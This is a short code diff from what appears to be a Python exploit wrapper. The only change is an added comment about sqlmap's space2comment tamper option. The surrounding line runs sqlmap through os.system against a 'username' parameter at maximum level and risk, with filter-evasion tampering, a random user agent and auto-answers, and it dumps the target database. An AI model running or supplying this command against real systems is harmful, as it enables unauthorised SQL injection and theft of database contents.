@@ -55,6 +55,7 @@ print(Style.RESET_ALL)
 ## Customize your exploit line
 ## WARNING! If you don't know what is this, don't edit it!
 ## Call some specialist =)
+## --tamper=space2comment = This is a custom setup that you can be setting up!
 ## BR
 os.system('python sqlmap.py -r /path/to/your/environment/exploit.txt -p username --time-sec=17 --tamper=space2comment --random-agent --level=5 --risk=3 --dbms=mysql --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" -D yourdatabase --dump')
 
